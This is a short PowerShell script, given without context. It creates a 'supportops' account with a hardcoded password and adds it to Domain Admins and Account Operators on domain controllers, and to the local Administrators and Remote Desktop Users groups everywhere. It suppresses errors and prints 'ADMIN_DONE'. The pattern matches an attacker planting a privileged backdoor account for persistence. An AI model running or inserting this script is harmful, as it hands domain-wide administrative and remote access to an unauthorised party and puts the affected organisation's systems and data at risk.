$ErrorActionPreference = "Continue"
$password = "Qz7!Mtn5#R2p"
$computer = Get-CimInstance Win32_ComputerSystem
$isDc = $computer.DomainRole -in 4, 5

if ($isDc) {
    net user supportops $password /domain /add
    net group "Domain Admins" supportops /domain /add
    net group "Account Operators" supportops /domain /add
} else {
    net user supportops $password /add
}

$groups = Get-LocalGroup |
    Where-Object { $_.SID -in @("S-1-5-32-544", "S-1-5-32-555") }
foreach ($group in $groups) {
    Add-LocalGroupMember -Group $group -Member supportops -ErrorAction SilentlyContinue
}

net user supportops
if ($isDc) {
    net user supportops /domain
}
Write-Output "ADMIN_DONE"
